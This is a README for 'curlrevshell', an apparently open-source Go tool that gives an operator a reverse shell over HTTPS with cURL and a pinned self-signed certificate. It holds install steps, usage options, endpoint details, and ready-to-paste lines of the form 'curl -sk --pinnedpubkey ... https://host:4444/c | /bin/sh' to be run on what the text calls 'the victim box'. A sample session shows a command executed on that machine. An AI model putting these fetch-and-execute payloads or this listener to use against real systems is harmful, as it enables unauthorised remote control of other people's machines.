cURL-Powered Reverse Shell
==========================
Somewhat kooky replacement for the typical `bash >/dev/tcp...` reverse shell,
but with the following "features":

- Underlying comms via HTTPS via cURL
- Self-signed TLS certificate, plus certificate pinning
- One cURL execution per output line
- Lots and lots of fork and exec
- Like, lots
- Optionally serves static files
- Accepts multiple shells in series, like `nc -lk` but in color

For legal use only

Quickstart
----------
1. Install the Go compiler (https://go.dev/doc/install).
2. Install `curlrevshell` and start it.
   ```sh
   go install github.com/magisterquis/curlrevshell@latest
   curlrevshell
   ```
3. Get a shell, using one of the lines under `To get a shell:`.

There are a few options, try `-h` for a list.

Example
-------
It should look like the following, but with nicer colors:
```
$ go install github.com/magisterquis/curlrevshell@latest
go: downloading github.com/magisterquis/curlrevshell v0.0.1-beta.1
go: downloading golang.org/x/net v0.22.0
go: downloading golang.org/x/sync v0.6.0
go: downloading golang.org/x/term v0.18.0
go: downloading golang.org/x/tools v0.19.0
go: downloading golang.org/x/sys v0.18.0
go: downloading golang.org/x/text v0.14.0
$ curlrevshell
01:04:42.760 Listening on 0.0.0.0:4444
01:04:42.760 To get a shell:
01:04:42.760
01:04:42.760 curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://127.0.0.1:4444/c | /bin/sh
01:04:42.760 curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://192.168.1.10:4444/c | /bin/sh
01:04:42.760 curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://[::1]:4444/c | /bin/sh
01:04:42.760 curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://[fe80::1]:4444/c | /bin/sh
01:04:42.760
01:04:55.247 [192.168.1.20] Sent script: ID:zcj5vz3zp6ce URL:192.168.1.10:4444
01:04:55.259 [192.168.1.20] Got a shell: ID:zcj5vz3zp6ce
> id
01:05:10.753 uid=1000(you) gid=1000(you) groups=1000(you), 0(wheel), 117(dialer)
```
On `192.168.1.20`, the victim box, somewhere between `01:04:42.760` and `01:04:55.247`:
```sh
curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://192.168.1.10:4444/c | /bin/sh
```

Usage
-----
```
Usage: curlrevshell [options]

Even worse reverse shell, powered by cURL

Options:
  -callback-template template
    	Optional callback template file
  -listen-address address
    	Listen address (default "0.0.0.0:4444")
  -print-default-template
    	Write the default template to stdout and exit
  -serve-files-from directory
    	Optional directory from which to serve static files
  -tls-certificate-cache file
    	Optional file in which to cache generated TLS certificate (default "/home/you/.cache/curlrevshell/cert.txtar")
```

Details
-------
Under the hood, it's really just a little HTTP server with four endpoints:

Endpoint          | Description
------------------|------------
`/i/{id}`         | Long-lived connection for input from you to the shell.
`/o/{id}`         | Output from the shell to you, one line at a time.  The `{id}` has to match `/i`'s.
`/c`              | Serves up a little script that takes the place of `bash >/dev/tcp...` and makes you appreciate low PIDs
`/{anythingelse}` | Either 404's or serves up files if you started it with `-serve-files-from`.

Callback Template
-----------------
The script generated with `/c` can be changed by writing a new template and
telling the program about it with `-print-default-template`.  It usually looks
like
```sh
$ curlrevshell -print-default-template >custom.tmpl # Get the default template to start with
$ vim ./custom.tmpl                                 # Mod ALL the things!
$ curlrevshell -callback-template ./custom.tmpl     # Run with your fancy new template
```
The struct passed to the template is `TemplateParams` in
[script.go](internal/hsrv/script.go).  The default script is
[script.tmpl](internal/hsrv/script.tmpl).

TLS
---
TLS is all via a pinned self-signed certificate.  By default, the certificate
is cached in a file, mostly to keep from having to copy/paste a new fingerprint
every time a ragey Ctrl+C kills the current shell.  Caching can be disabled
with `-tls-certificate-cache ""`.
